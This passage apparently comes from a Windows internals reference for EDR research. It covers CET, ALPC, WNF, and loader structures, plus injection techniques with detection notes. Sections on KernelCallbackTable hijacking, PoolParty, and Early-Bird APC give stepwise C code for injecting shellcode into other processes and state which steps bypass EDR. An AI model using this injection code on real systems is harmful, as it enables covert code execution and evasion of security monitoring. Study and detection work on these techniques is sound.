### 3.4 Kernel CET (HVCI-dependent)

Kernel CET requires HVCI (Hypervisor-Protected Code Integrity) to be enabled:

```
CR4 bit 23  (0x800000) = CET support enabled
ETHREAD.MiscFlags bit 22 = CetKernelShadowStack
nt!KiKernelCetEnabled  (global flag)
```

**Thread creation with kernel shadow stack:**
```
PspAllocateThread
  -> KeInitThread -> MmCreateKernelStack (regular stack)
  -> KiCreateKernelShadowStack  (if KiKernelCetEnabled)
     -> VslAllocateKernelShadowStack (secure system call #230 to VTL 1)
        -> securekernel!SkmmCreateNtKernelShadowStack
           -> SkmiClaimPhysicalPage: marks pages read-only via HvCallModifyVtlProtectionMask (hypercall 12)
           -> Places restore token at shadow stack offset 0xFF8
```

The restore token has bit 0 set (`token | 1`), signaling to `RSTORSSP` that this is a
valid restoration point.

### 3.5 NtContinue and synthetic frames

`NtContinue` (and `NtContinueEx`) is the primary point where user-mode code can attempt to
modify RIP. When CET is enabled, the kernel calls `KeVerifyContextXStateCetU`:

- Forces `MSR_IA32_CET_SHSTK_EN` to remain set (cannot be disabled by user).
- Validates new SSP: must be 8-byte aligned, within the thread's shadow stack VAD, and
  within previously used stack bounds.
- Validates target RIP (if `UserCetSetContextIpValidation` is set) against:
  - Long jump table (`.gljmp` section / `GuardLongJumpTargetTable` in image load config)
  - Exception handler continuation table (`GuardEHContinuationTable`)
  - Dynamic targets registered via `ProcessDynamicEHContinuationTargets`

`KCONTINUE_TYPE` enum in `NtContinueEx`:
```
KCONTINUE_UNWIND   = 0  (legacy exception unwinding)
KCONTINUE_RESUME   = 1  (APC delivery)
KCONTINUE_LONGJUMP = 2  (setjmp/longjmp)
KCONTINUE_SET      = 3  (NtSetContextThread)
```

Each type passes through different validation in `RtlVerifyUserUnwindTarget`.

### 3.6 EDR/hypervisor leverage of CET for detection

- EDRs can query `SharedUserData.XState.EnabledFeatures` for XSTATE_CET_U bit to determine
  if user-mode CET is active on the system.
- `STATUS_SET_CONTEXT_DENIED` returned by `NtSetContextThread` indicates CET blocked an
  invalid RIP modification — a detection signal.
- Hypervisors (VBS) use `HvCallModifyVtlProtectionMask` to make shadow stack pages
  read-only from VTL 0; any write attempt generates a VTL-switch to the secure kernel.
- VMCS field `VMX_GUEST_SSP` (register code `0x8008E`) is updated by the secure kernel on
  context restore, observable through VMX tracing.

---

## 4. ALPC in EDR Context

### 4.1 Port object types

ALPC communication always involves three port objects:
1. **Server Connection Port**: Created by `NtAlpcCreatePort`; server listens here.
2. **Server Communication Port**: Created when server calls `NtAlpcAcceptConnectPort`; one per client.
3. **Client Communication Port**: Created on client side by `NtAlpcConnectPort`.

All three instantiate `_ALPC_PORT` (a.k.a. `KALPC_PORT`) kernel objects.

### 4.2 PORT_MESSAGE / LPC_MESSAGE structure

```c
typedef struct _PORT_MESSAGE {
    union {
        struct { USHORT DataLength; USHORT TotalLength; } s1; // +0x00
        ULONG Length;
    } u1;
    union {
        struct { USHORT Type; USHORT DataInfoOffset; } s2;    // +0x04
        ULONG ZeroInit;
    } u2;
    union {
        CLIENT_ID  ClientId;   // +0x08  ProcessId + ThreadId (kernel-populated)
        double     DoNotUseThisField;
    };
    ULONG  MessageId;          // +0x18  Unique message sequence number
    union {
        SIZE_T ClientViewSize;  // +0x20  (on server connection port)
        ULONG  CallbackId;
    };
} PORT_MESSAGE;  // 0x28 bytes total
```

`DataLength` = payload size; `TotalLength` = sizeof(PORT_MESSAGE) + DataLength.
`Type` values: `LPC_REQUEST=1`, `LPC_REPLY=2`, `LPC_DATAGRAM=3`, `LPC_LOST_REPLY=4`, etc.

### 4.3 _ALPC_PORT kernel structure (key fields, ~0x1D8 bytes)

```
+0x010 CommunicationInfo  : ALPC_COMMUNICATION_INFO*
+0x018 OwnerProcess       : EPROCESS*
+0x020 CompletionPort     : KQUEUE*            // I/O completion port if set
+0x090 MainQueue          : LIST_ENTRY         // Pending messages
+0x0A0 LargeMessageQueue  : LIST_ENTRY         // Large message overflow
+0x100 PortAttributes     : ALPC_PORT_ATTRIBUTES  // includes QoS
+0x1A0 State              : bitfield
         Initialized : 1
         Type        : 3   // 0=Server, 1=Client, 2=Server-side comm, 3=Unconnected
         Disconnected: 1
         ...
+0x1A8 TargetQueuePort    : ALPC_PORT*         // Linked partner port
```

### 4.4 Security descriptor on ALPC ports

ALPC ports are securable kernel objects. Security descriptors are specified during
`NtAlpcCreatePort` via `OBJECT_ATTRIBUTES.SecurityDescriptor`. However, most built-in ALPC
servers (including some EDR servers) accept connections from Everyone, performing
identity checks only post-connection via `ALPC_CONTEXT_ATTR`.

`ALPC_CONTEXT_ATTR` is automatically attached by the kernel to every message regardless of
what the sender requests, providing server-side client identification without spoofing.

### 4.5 WdFilter.sys — Filter Communication Ports (not ALPC)

Microsoft Defender's kernel driver (`WdFilter.sys`) uses **minifilter communication ports**
(`FltCreateCommunicationPort`), not raw ALPC. These are a separate IPC mechanism built on
top of the Filter Manager.

**Four ports created by `MpCreateCommPorts`:**
```
\MicrosoftMalwareProtectionControlPort    — has MessageNotifyCallback (sync)
\MicrosoftMalwareProtectionPort
\MicrosoftMalwareProtectionVeryLowIoPort
\MicrosoftMalwareProtectionRemoteIoPort
```

All are protected by a security descriptor using `MpServiceSID` — only MsMpEng.exe
(running as LOCAL SYSTEM with the Defender service SID) can connect.

**Filter comm port vs raw ALPC:**
- No `NtAlpcCreatePort` syscall — uses file-based handle via `\FileSystem\Filters\FltMgrMsg`.
- Messages use `FltSendMessage` (sync) or async via worker thread queue.
- Backed by cancel-safe IRP queues (`IoCsqXxx`), not ALPC queues.

**AsyncMessageData structure (simplified):**
```c
struct AsyncMessageData {
    ULONG  Magic;
    ULONG  Size;
    ULONG  NotifySeq;
    ULONG  DataSize;
    ULONG  OperationType;
    union  { /* ImageLoadNotify, ProcessNotify, ThreadNotify, etc. */ };
};
```

**EDR vs IOCTL:**
Some EDR components (e.g. CrowdStrike CSAgent) use both filter comm ports AND direct IOCTL
DeviceIoControl paths via `\Device\csagent`. IOCTL is used for synchronous queries from
user mode; filter comm ports handle asynchronous kernel→user-mode notifications.

---

## 5. Windows Notification Facility (WNF)

### 5.1 WNF_STATE_NAME encoding

A WNF state name is an opaque 64-bit integer. Its internal decoded structure:

```c
// XOR with 0x41C64E6DA3BC0074 to decode
typedef struct _WNF_STATE_NAME_STRUCT {
    ULONG64 Version      : 4;   // Always 1
    ULONG64 NameLifetime : 2;   // 0=WellKnown,1=Permanent,2=Persistent,3=Temporary
    ULONG64 DataScope    : 4;   // 0=System,1=Session,2=User,3=Process,4=Machine,5=PhysicalMachine
    ULONG64 PermanentData: 1;   // If set, data survives across reboots (registry-backed)
    ULONG64 Unique       : 53;  // Monotonically incrementing sequence number
} WNF_STATE_NAME_STRUCT;
```

Well-known state names (e.g. `WNF_SHEL_DESKTOP_APPLICATION_STARTED`) are hardcoded and
cannot be created by user mode.

### 5.2 Kernel structures

**_WNF_NAME_INSTANCE** (kernel object per state name):
```
NodeTypeCode    : USHORT              // Identifies WNF object type
NodeByteSize    : USHORT
RefCount        : LONG
StateName       : WNF_STATE_NAME_STRUCT
TreeLinks       : RTL_BALANCED_NODE  // In binary tree of name instances
ScopeInstance   : WNF_SCOPE_INSTANCE*
StateNameInfo   : WNF_STATE_NAME_REGISTRATION*
StateDataLock   : EX_PUSH_LOCK
StateData       : WNF_STATE_DATA*    // Current data
CurrentChangeStamp: WNF_CHANGE_STAMP (ULONG)
PermanentDataStore: HANDLE           // Registry key handle for persistent names
StateSubscriptionListHead: LIST_ENTRY // All WNF_USER_SUBSCRIPTION instances
```

**_WNF_STATE_DATA** (data blob):
```
Header          : WNF_CONTEXT_HEADER
AllocatedSize   : ULONG             // Max 0x1000 (4096) bytes
DataSize        : ULONG
ChangeStamp     : ULONG
// Actual data immediately follows this struct at StateData + 0x10
```

**_WNF_USER_SUBSCRIPTION** (one per subscriber):
```
ListEntry       : LIST_ENTRY        // Links under WNF_NAME_INSTANCE.StateSubscriptionListHead
SubscriptionId  : ULONGLONG
StateName       : WNF_STATE_NAME_STRUCT
UserCallback    : PWNF_USER_CALLBACK   ← injection target
CallbackContext : PVOID
// ... process context, change stamps
```

### 5.3 Core APIs

```
NtCreateWnfStateName     — creates a new state name
NtDeleteWnfStateName     — deletes a state name
NtQueryWnfStateData      — reads published data
NtUpdateWnfStateData     — publishes data → triggers all subscriber callbacks
NtSubscribeWnfStateChange — creates WNF_USER_SUBSCRIPTION with callback
NtUnsubscribeWnfStateChange
```

### 5.4 WNF code injection technique

Technique originally demonstrated by `@modexpblog`; largely undetected by EDR because it
uses no `CreateRemoteThread` or similar creation primitives:

**Steps:**
1. Find a GUI or system process with known WNF subscriptions (most processes have them).
2. Enumerate `WNF_USER_SUBSCRIPTION` objects in the target process via
   `NtQueryInformationProcess` + memory scanning for the well-known `WNF_NAME_INSTANCE`
   objects in kernel, or by reading the target's subscription list from memory.
3. `VirtualAllocEx` + `WriteProcessMemory` to inject shellcode.
4. Overwrite `WNF_USER_SUBSCRIPTION.UserCallback` pointer with shellcode address using
   `WriteProcessMemory`.
5. Call `NtUpdateWnfStateData` targeting that state name → kernel dispatches the
   modified callback in the target process context.
6. Restore original callback pointer.

**EDR monitoring of WNF:**
- Monitor `WriteProcessMemory` to callback pointer regions (requires knowing structure layout).
- Hook `NtSubscribeWnfStateChange` to track subscriber lists.
- Trail of Bits introduced `WNF_CI_*` state names that signal code integrity events:
  - `WNF_CI_BLOCKED_DRIVER` — HVCI-blocked driver load
  - `WNF_CI_CODEINTEGRITY_MODE_CHANGE` — CI mode alteration
  - These are used by Defender and other security tools for CI event delivery.

### 5.5 WNF for persistence

Permanent and Persistent state names are stored in:
```
HKLM\SYSTEM\CurrentControlSet\Control\Notifications\{StateName}
```
The kernel writes state data to this key on `NtUpdateWnfStateData` if `PermanentData = 1`.
This provides a persistence mechanism that survives reboots without writing to disk
directly.

---

## 6. KernelCallbackTable Hijacking

### 6.1 PEB.KernelCallbackTable layout

```c
// PEB offset 0x058 (x64)
PVOID KernelCallbackTable;
```

This is a pointer to an array of function pointers, populated when `user32.dll` is first
loaded into a GUI process. Each entry is a PVOID to a `user32!__fn*` function. The table is
untyped and completely undocumented by Microsoft.

**Condition:** Only processes that have loaded `user32.dll` have a non-NULL
`KernelCallbackTable`. Console processes and SYSTEM processes without GUI do not.

### 6.2 Function table contents (partial, indices vary by OS version)

```
Index  Function                  Trigger
  0    __fnCOPYDATA              WM_COPYDATA message
  1    __fnCOPYGLOBALDATA        WM_COPYDATA global data
  2    __fnDWORD                 Various DWORD-parameter messages
  3    __fnNCDESTROY             WM_NCDESTROY
  4    __fnDWORDOPTINLPMSG       Optional LPMSG messages
  5    __fnINOUTDRAG             OLE drag/drop
  6    __fnGETTEXTLENGTHS        WM_GETTEXTLENGTH
  7    __fnINCNTOUTSTRING        WM_GETTEXT
  8    __fnPOUTLPINT             WM_GETDLGCODE
  9    __fnINLPCOMPAREITEMSTRUCT WM_COMPAREITEM
 10    __fnINLPCREATESTRUCT      WM_CREATE / WM_NCCREATE
 11    __fnINLPDELETEITEMSTRUCT  WM_DELETEITEM
 12    __fnINLPDRAWITEMSTRUCT    WM_DRAWITEM
 13    __fnPOPTINLPUINT          WM_SIZING
 14    __fnPOPTINLPUINT2         WM_MOVING
 15    __fnINLPMDICREATESTRUCT   WM_MDICREATE
 16    __fnINOUTLPMEASUREITEMSTRUCT WM_MEASUREITEM
 17    __fnINLPWINDOWPOS         WM_WINDOWPOSCHANGED
 18    __fnINOUTLPPOINT5         WM_NCHITTEST
 19    __fnINOUTLPSCROLLINFO    WM_GETSCROLLINFO
 20    __fnINOUTLPRECT           WM_GETMINMAXINFO
 21    __fnINOUTNCCALCSIZE       WM_NCCALCSIZE
 22    __fnINPAINTCLIPBRD        WM_PAINTCLIPBOARD
 23    __fnINSIZECLIPBRD         WM_SIZECLIPBOARD
...
     __ClientCopyDDEIn1
     __ClientCopyDDEIn2
     __ClientCopyDDEOut1
     __ClientCopyDDEOut2
```

Indices and total count vary between Windows versions.

### 6.3 Injection technique

```c
// 1. Get PEB of target GUI process
PROCESS_BASIC_INFORMATION pbi;
NtQueryInformationProcess(hProc, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);

// 2. Read KernelCallbackTable pointer from PEB
PVOID kctPtr;
ReadProcessMemory(hProc, (BYTE*)pbi.PebBaseAddress + 0x58, &kctPtr, 8, NULL);

// 3. Read existing table
PVOID kct[256];
ReadProcessMemory(hProc, kctPtr, kct, sizeof(kct), NULL);

// 4. Allocate shellcode + malicious table in target
PVOID shellcode = VirtualAllocEx(hProc, NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProc, shellcode, buf, shellSize, NULL);

// 5. Copy original table, replace fnCOPYDATA (index 0)
PVOID newKct = VirtualAllocEx(hProc, NULL, sizeof(kct), MEM_COMMIT, PAGE_READWRITE);
kct[0] = shellcode;   // __fnCOPYDATA at index 0
WriteProcessMemory(hProc, newKct, kct, sizeof(kct), NULL);

// 6. Update PEB.KernelCallbackTable
WriteProcessMemory(hProc, (BYTE*)pbi.PebBaseAddress + 0x58, &newKct, 8, NULL);

// 7. Trigger via WM_COPYDATA to any window owned by target process
SendMessage(targetHwnd, WM_COPYDATA, ...);
```

### 6.4 EDR detection

- Monitor PEB cross-process writes (`WriteProcessMemory` targeting `PEB+0x58`).
- Validate that `KernelCallbackTable` pointer lies within the `user32.dll` image range.
- `PsSetLoadImageNotifyRoutine` + `MmGetSystemRoutineAddress` to get user32 base and check
  KCT alignment.
- Known threat actors: FinFisher, Lazarus Group.
- Only affects GUI processes (user32 loaded).

---

## 7. Thread Pool Injection (PoolParty)

### 7.1 Thread pool architecture

Windows provides a default thread pool per process. Worker threads sit in:
```
ntdll!TppWorkerThread
  -> NtWaitForWorkViaWorkerFactory  (syscall — suspends until work arrives)
  -> executes work item callback
  -> loops back
```

The kernel-side `WORKER_FACTORY` object manages these threads. User-side handle returned
by `CreateThreadpool`.

### 7.2 Key structures

**TP_CALLBACK_ENVIRON (user-mode, winnt.h):**
```c
typedef struct _TP_CALLBACK_ENVIRON_V3 {
    TP_VERSION                 Version;       // = 3
    PTP_POOL                   Pool;          // Thread pool handle
    PTP_CLEANUP_GROUP          CleanupGroup;
    PTP_CLEANUP_GROUP_CANCEL_CALLBACK CleanupGroupCancelCallback;
    PVOID                      RaceDll;
    struct _ACTIVATION_CONTEXT *ActivationContext;
    PTP_SIMPLE_CALLBACK        FinalizationCallback;
    union {
        DWORD                  Flags;
        struct { DWORD LongFunction : 1; DWORD Persistent : 1; /* ... */ };
    } u;
    TP_CALLBACK_PRIORITY       CallbackPriority;
    DWORD                      Size;
} TP_CALLBACK_ENVIRON_V3;
```

**Kernel-side work item types (PoolParty targets):**
```
TP_WORK     — simple callback work
TP_TIMER    — timer-based callback
TP_WAIT     — waitable object callback
TP_IO       — I/O completion callback
TP_ALPC     — ALPC message callback
TP_JOB      — job object callback
TP_DIRECT   — direct queue insertion (no proxy object needed)
```

### 7.3 NtSetInformationWorkerFactory

This undocumented syscall controls the worker factory:

```c
// WorkerFactoryBasicInformation = class 0
// WorkerFactoryThreadMinimum    = class 1  ← used in PoolParty Variant 1
// WorkerFactoryStartRoutine     = class 2  ← directly controls start routine
// WorkerFactoryMaxThread        = class 4

NtSetInformationWorkerFactory(
    HANDLE WorkerFactoryHandle,
    WORKERFACTORYINFOCLASS WorkerFactoryInformationClass,
    PVOID WorkerFactoryInformation,
    ULONG WorkerFactoryInformationLength
);
```

**Variant 1 — WorkerFactory start routine hijack:**
```c
// Write shellcode address as new start routine
PVOID shellcode = ...; // injected into target process
NtSetInformationWorkerFactory(hFactory, WorkerFactoryStartRoutine, &shellcode, 8);
// Increase minimum threads to trigger creation of new worker → executes shellcode
ULONG minThreads = currentThreads + 1;
NtSetInformationWorkerFactory(hFactory, WorkerFactoryThreadMinimum, &minThreads, 4);
```

**Variant 2 — TP_WORK task queue injection:**
Overwrite the callback pointer in a `TP_WORK` structure in the target process, then submit
the work item. The overwrite uses `WriteProcessMemory`; execution is triggered by
`SubmitThreadpoolWork` from within the target or by the system.

**Variants 3–7 (I/O completion queue):**
Associate `TP_WAIT`, `TP_ALPC`, `TP_JOB`, etc. with legitimate Windows objects; overwrite
callback pointer; trigger the associated event (e.g. set a waitable event, write to a file,
assign a job). Execution appears as legitimate I/O completion handling.

**Variant 8 — Timer queue:**
Inject shellcode address into a `TP_TIMER` structure; fire the timer.

### 7.4 EDR bypass comparison vs CreateRemoteThread

| Attribute | CreateRemoteThread | PoolParty |
|-----------|-------------------|-----------|
| Thread creation | Explicit; triggers `PsSetCreateThreadNotifyRoutine` | None (existing worker threads) |
| Visible in ETW | Yes (`Microsoft-Windows-Kernel-Process` provider) | No new thread events |
| NtCreateThreadEx syscall | Yes | No |
| Memory allocation required | Yes | Yes (for shellcode) |
| EDR hook bypass | No | Yes — no thread-creation primitive |
| Execution trigger | Direct | Legitimate OS operation (file write, event signal, etc.) |

All 8 PoolParty variants were tested against 5 leading EDR products and bypassed detection
(Black Hat Europe 2023, SafeBreach Labs).

---

## 8. Early-Bird APC Injection

### 8.1 Process initialization timeline

When a process is created and the first thread starts, the execution sequence is:

```
KiUserApcDispatcher
  -> ntdll!LdrInitializeThunk
     -> ntdll!LdrpInitialize
        -> ntdll!_LdrpInitialize
           -> ... (heap, TLS, etc. setup)
           -> TLS callbacks execute   ← TLS runs BEFORE APCs drain
           -> ntdll!ZwTestAlert       ← kernel checks APC queue; dispatches user APCs
              -> KiUserApcDispatcher (for each queued APC)
           -> ntdll!LdrpInitializeProcess
              -> Load DLLs (DLL_PROCESS_ATTACH callbacks)
              -> EDR DLL injected here via PsSetLoadImageNotifyRoutine
     -> Process entry point (main/WinMain)
```

**Key ordering:** APC fires at `ZwTestAlert` → **before** DLL_PROCESS_ATTACH of any DLL
(including the EDR's DLL) → **after** TLS callbacks.

### 8.2 Injection steps

```c
// 1. Create target process in suspended state
PROCESS_INFORMATION pi;
CreateProcessA("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE,
               CREATE_SUSPENDED, NULL, NULL, &si, &pi);

// 2. Allocate and write shellcode in new process
LPVOID shellAddr = VirtualAllocEx(pi.hProcess, NULL, shellSize,
                                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, shellAddr, shellcode, shellSize, NULL);

// 3. Queue APC to the main (and only) thread — still in suspended state
QueueUserAPC((PAPCFUNC)shellAddr, pi.hThread, 0);

// 4. Resume thread — APC fires during LdrInitializeThunk before any EDR hooks load
ResumeThread(pi.hThread);
```

### 8.3 Why it bypasses EDR hooks

EDRs that rely on **DLL injection** to hook APIs (the most common model) inject their
monitoring DLL via `PsSetLoadImageNotifyRoutine`. This callback fires when a new image is
mapped, but the EDR DLL's `DllMain(DLL_PROCESS_ATTACH)` runs as part of `LdrpInitializeProcess`,
which happens **after** `ZwTestAlert` in the initialization sequence. Therefore:

- Shellcode queued as APC executes at `ZwTestAlert` time.
- EDR's userland hooks do not yet exist.
- The shellcode runs before any API hooking is in place.

**Limitation:** EDR kernel callbacks (`PsSetCreateProcessNotifyRoutineEx`,
`PsSetCreateThreadNotifyRoutine`) fire at process/thread creation and may detect the
injection from the injecting process's API calls (`VirtualAllocEx`, `WriteProcessMemory`,
`QueueUserAPC`, etc.) regardless of when the payload executes.

### 8.4 Variants and improvements

- **Early Cascade Injection** (Outflank, 2024): No remote execution primitive at all.
  Instead of `QueueUserAPC`, abuses `NtCreateSection` + `NtMapViewOfSection` to share
  a writable section with the target, then overwrites a function pointer the target calls
  during early init. No `WriteProcessMemory` call at all — harder to detect.

- **Early Cryo Bird**: Uses `NtSetInformationJobObject` with an undocumented information
  class to freeze the process (avoid `CREATE_SUSPENDED` flag detection), then injects.

---

## 9. Process Herpaderping (Image Masking)

### 9.1 Exact syscall sequence

```
1.  OpenFile / NtOpenFile (GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ)
    — Open target executable with write access while keeping file handle open

2.  WriteFile / NtWriteFile
    — Write malicious payload (shellcode/PE) into the file

3.  NtCreateSection (SEC_IMAGE, PAGE_READONLY)
    — Map the file as an executable image section
    — Windows caches this image mapping in the file object's
      SECTION_OBJECT_POINTERS->ImageSectionObject

4.  NtCreateProcessEx (SectionHandle = section from step 3)
    — Creates EPROCESS; the section is fixed to this process

5.  WriteFile (again, to the same open handle)
    — Overwrite the on-disk file with benign/decoy content
    — The cached section object is NOT invalidated; it still references the original payload

6.  NtCreateThreadEx
    — Creates initial thread → TRIGGERS PsSetCreateProcessNotifyRoutineEx callback
    — Security products inspect the file at this point and see the DECOY content

7.  CloseHandle (file handle) → triggers IRP_MJ_CLEANUP
    — File may be restored to benign state or remain modified
```

### 9.2 Differences: Herpaderping vs Ghosting vs Doppelganging

| Technique | File State at Callback | Transactions | File Deleted | Detection via MappedFileName |
|-----------|------------------------|--------------|--------------|------------------------------|
| Herpaderping | File on disk = DECOY; section = payload | None | No | Path is valid; content mismatch |
| Ghosting | File deleted after section creation | None (delete-on-close) | Yes | MappedFileName returns empty/NULL |
| Doppelganging | File content restored (TxF rollback) | Yes (TxF) | No (rolled back) | Path valid; TxF-based mismatch |

### 9.3 Detection via NtQueryVirtualMemory MappedFileName

```c
// Get the mapped filename of the process's main executable section
MEMORY_MAPPED_FILE_NAME_INFORMATION info;
NtQueryVirtualMemory(hProcess, baseAddress, MemoryMappedFilenameInformation,
                     &info, sizeof(info), &retLen);
// Herpaderping: info.FileName is valid (e.g. L"\\Device\\HarddiskVolume3\\temp\\payload.exe")
// Ghosting:     info.FileName is empty (file was deleted)
// Doppelganging: info.FileName may be valid but content mismatches on disk
```

**Deeper detection — content coherency check:**
Read the process's module image from virtual memory and compare against the on-disk file
byte-by-byte. For Herpaderping, these will differ (payload in memory, decoy on disk). This
is what tools like Process Hacker / System Informer implement.

### 9.4 PsSetCreateProcessNotifyRoutineEx timing gap

Security products registered via `PsSetCreateProcessNotifyRoutineEx` receive the callback
when the initial thread is inserted (`NtCreateThreadEx`), not when the process object is
created (`NtCreateProcessEx`). This gap is exactly what Herpaderping exploits — steps 1–5
happen before any security callback fires.

---

## 10. LDR_DATA_TABLE_ENTRY Structure

### 10.1 Complete layout (x64, Windows 10 1909 / Windows 11, 0x120 bytes)

```c
typedef struct _LDR_DATA_TABLE_ENTRY {
    /* 0x000 */ LIST_ENTRY InLoadOrderLinks;         // PEB_LDR_DATA.InLoadOrderModuleList
    /* 0x010 */ LIST_ENTRY InMemoryOrderLinks;       // PEB_LDR_DATA.InMemoryOrderModuleList
    /* 0x020 */ LIST_ENTRY InInitializationOrderLinks; // PEB_LDR_DATA.InInitializationOrderModuleList
    /* 0x030 */ PVOID      DllBase;                  // Module base address
    /* 0x038 */ PVOID      EntryPoint;               // DLL entry point (DllMain)
    /* 0x040 */ ULONG      SizeOfImage;              // Size of mapped image
    /* 0x044 */ ULONG      _pad;
    /* 0x048 */ UNICODE_STRING FullDllName;          // Full path e.g. L"C:\Windows\System32\ntdll.dll"
    /* 0x058 */ UNICODE_STRING BaseDllName;          // Filename e.g. L"ntdll.dll"
    /* 0x068 */ union {
                    ULONG  FlagGroup[4];
                    ULONG  Flags;                    // Load status flags
                };
    /* 0x06C */ USHORT     ObsoleteLoadCount;        // Reference count (legacy; now in DdagNode)
    /* 0x06E */ USHORT     TlsIndex;
    /* 0x070 */ LIST_ENTRY HashLinks;                // Links in LdrpHashTable[hash(BaseDllName)]
    /* 0x080 */ ULONG      TimeDateStamp;            // From PE header; used for version checking
    /* 0x084 */ ULONG      _pad2;
    /* 0x088 */ PVOID      EntryPointActivationContext;
    /* 0x090 */ PVOID      Lock;                     // Per-module lock
    /* 0x098 */ LDR_DDAG_NODE* DdagNode;            // Dependency DAG node
    /* 0x0A0 */ LIST_ENTRY NodeModuleLink;
    /* 0x0B0 */ LDRP_LOAD_CONTEXT* LoadContext;
    /* 0x0B8 */ PVOID      ParentDllBase;
    /* 0x0C0 */ PVOID      SwitchBackContext;
    /* 0x0C8 */ RTL_BALANCED_NODE BaseAddressIndexNode; // In LdrpModuleBaseAddressIndex
    /* 0x0E0 */ RTL_BALANCED_NODE MappingInfoIndexNode;
    /* 0x0F8 */ ULONGLONG  OriginalBase;             // Preferred base (pre-relocation)
    /* 0x100 */ LARGE_INTEGER LoadTime;
    /* 0x108 */ ULONG      BaseNameHashValue;        // ROR13 hash of BaseDllName
    /* 0x10C */ LDR_DLL_LOAD_REASON LoadReason;     // enum: StaticDependency, DynamicLoad, etc.
    /* 0x110 */ ULONG      ImplicitPathOptions;
    /* 0x114 */ ULONG      ReferenceCount;
    /* 0x118 */ ULONG      DependentLoadFlags;
    /* 0x11C */ UCHAR      SigningLevel;             // Code signing level
    /* 0x11D - 0x11F: padding */
} LDR_DATA_TABLE_ENTRY;  // sizeof = 0x120
```

### 10.2 PEB.Ldr traversal

```c
// PEB.Ldr at PEB+0x018 (x64)
PEB_LDR_DATA* ldr = (PEB_LDR_DATA*)(*((PVOID*)((PBYTE)peb + 0x18)));

// ldr->InMemoryOrderModuleList.Flink points to LDR_DATA_TABLE_ENTRY.InMemoryOrderLinks
// (note: offset of InMemoryOrderLinks within LDR_DATA_TABLE_ENTRY is 0x10)
// so subtract 0x10 to get to DllBase:

for (LIST_ENTRY* e = ldr->InMemoryOrderModuleList.Flink;
     e != &ldr->InMemoryOrderModuleList;
     e = e->Flink) {
    LDR_DATA_TABLE_ENTRY* entry = CONTAINING_RECORD(e, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
    // entry->DllBase, entry->BaseDllName, entry->TimeDateStamp
}
```

**Standard iteration order for first 3 entries (InMemoryOrderModuleList):**
1. Process executable itself
2. ntdll.dll
3. kernel32.dll  ← reflective loaders typically stop here to get LoadLibrary/GetProcAddress

### 10.3 HashLinks and LdrpHashTable

`LdrpHashTable` is an array of 32 (`LDR_HASH_TABLE_ENTRIES_COUNT`) `LIST_ENTRY` heads.
Hash is computed as ROR13 of the Unicode lowercase DLL name, modulo 32.
`LDR_DATA_TABLE_ENTRY.BaseNameHashValue` stores this precomputed hash.

EDR/AV tools that scan for loaded modules by walking `LdrpHashTable` (instead of or in
addition to the `PEB.Ldr` lists) can still find entries even if the main module lists are
manipulated.

### 10.4 TimeDateStamp for version checking

`TimeDateStamp` at offset 0x080 is copied from the PE header's `IMAGE_FILE_HEADER.TimeDateStamp`.
Security tools use this to verify the expected build/version of loaded DLLs and detect
module stomping (where `DllBase` content differs from the expected PE but the LDR entry
remains).

### 10.5 Reflective DLL injection and LDR bypass

Classic reflective DLL injection (`ReflectiveDLLInjection` by Stephen Fewer):

1. DLL allocates itself in target via `VirtualAllocEx`.
2. `ReflectiveLoader` (embedded function at known offset) performs:
   - Manual PE mapping (headers, sections, imports, relocations)
   - Resolves `LoadLibrary`/`GetProcAddress` by walking PEB module list
   - Calls `DllMain(DLL_PROCESS_ATTACH)`
3. **No `LDR_DATA_TABLE_ENTRY` is created** — the DLL is invisible to PEB walks.

**Detection methods:**
- PEB module list walk (misses reflective DLLs — this is the bypass).
- Memory scanning for unexpected PE headers (`MZ` + valid `NT_HEADERS`) in
  `PAGE_EXECUTE_*` regions not backed by known modules.
- `NtQueryVirtualMemory(MemoryMappedFilenameInformation)` returns NULL for
  reflectively loaded DLLs (no file backing).
- Thread call stack analysis: threads executing inside unbacked memory regions.
- `LdrpModuleBaseAddressIndex` (RTL_RB_TREE) — reflective DLLs are absent here too.

**Advanced evasion:** Some reflective loaders do add a fake `LDR_DATA_TABLE_ENTRY` to all
three module lists and `LdrpHashTable` to appear legitimate. In that case, EDR must verify
that the module's `DllBase` content actually matches the file referenced in `FullDllName`
(i.e., coherency checking).

---

## Reference: Key Structure Source Locations

| Topic | Primary References |
|-------|--------------------|
| _WMI_LOGGER_CONTEXT | geoffchappell.com, vergiliusproject.com, connormcgarr.github.io/securitytrace-etw-ppl |
| _ETW_GUID_ENTRY / _ETW_REG_ENTRY | geoffchappell.com, fluxsec.red (full spectrum ETW detection) |
| ETW evasion (Lazarus FudModule) | gendigital.com/blog/insights/research/lazarus-and-the-fudmodule-rootkit |
| _ETW_SILODRIVERSTATE | geoffchappell.com, vergiliusproject.com |
| EPROCESS offsets | vergiliusproject.com (per-version), keramas.github.io/2020/06/21 |
| PS_PROTECTION | itm4n.github.io/lsass-runasppl |
| MitigationFlags | geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/ps/eprocess/mitigationflags |
| CET / Shadow Stack | windows-internals.com/cet-on-windows, connormcgarr.github.io/km-shadow-stacks |
| ALPC internals | csandker.io/2022/05/24/Offensive-Windows-IPC-3-ALPC |
| WdFilter comm ports | n4r1b.com/posts/2020/01/dissecting-the-windows-defender-driver-wdfilter-part-1 |
| Filter comm ports | windows-internals.com/investigating-filter-communication-ports |
| WNF | blog.quarkslab.com/playing-with-the-windows-notification-facility-wnf, pwnedcoffee.com/blog/wnf-chronicles-i-introduction |
| WNF injection | blog.trailofbits.com/2023/05/15/introducing-windows-notification-facilitys-wnf-code-integrity |
| KernelCallbackTable | captmeelo.com/redteam/maldev/2022/04/21/kernelcallbacktable-injection, 0xHossam/KernelCallbackTable-Injection-PoC |
| PoolParty thread pool injection | safebreach.com/blog/process-injection-using-windows-thread-pools, securityboulevard.com poolparty writeup |
| Early-Bird APC | ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection, cyberbit.com/endpoint-security/new-early-bird-code-injection-technique-discovered |
| Early Cascade | outflank.nl/blog/2024/10/15/introducing-early-cascade-injection |
| Herpaderping | jxy-s.github.io/herpaderping, huntandhackett.com/blog/concealed-code-execution-techniques-and-detection |
